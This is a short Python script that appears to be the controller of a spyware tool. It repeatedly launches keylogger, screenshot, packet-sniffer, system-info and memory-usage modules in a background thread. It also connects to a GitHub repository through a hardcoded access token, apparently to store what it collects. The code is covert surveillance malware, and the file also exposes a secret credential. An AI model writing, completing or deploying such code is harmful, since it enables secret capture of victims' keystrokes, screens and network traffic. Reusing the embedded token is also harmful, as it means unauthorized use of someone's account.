from github import Github
from keylogger import Keylogger
from getMemory import getMemory
from screenshot import Screenshot
from sniffer import Sniffer
from sysInfo import sysInfo
import psutil
import time
import threading

access_token = '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'
g = Github(access_token)
user = g.get_user()
repo = user.get_repo('pythonDevelopment2')

def start_program():
    while True:
        mod_keylogger()
        print("a")
        mod_getMemory()
        print("b")
        mod_screenshotter()
        print("c")
        mod_sniffer()
        print("d")
        mod_sysInfo()
        print("gelukt")
        time.sleep(10)  # Wacht 60 seconden voordat de cyclus wordt herhaald

def mod_keylogger():
    k = Keylogger()
    k.start_keylogger()

def mod_getMemory():
    s = getMemory()
    s.get_usage(psutil.cpu_percent(), psutil.virtual_memory().percent, 30)
    time.sleep(0.5)

def mod_screenshotter():
    s = Screenshot()
    s.auto_screen()

def mod_sniffer():
    s = Sniffer()
    s.start_sniffing()

def mod_sysInfo():
    s = sysInfo()
    s.get_info()


if __name__ == "__main__":
    start_program_thread = threading.Thread(target=start_program)
    start_program_thread.start()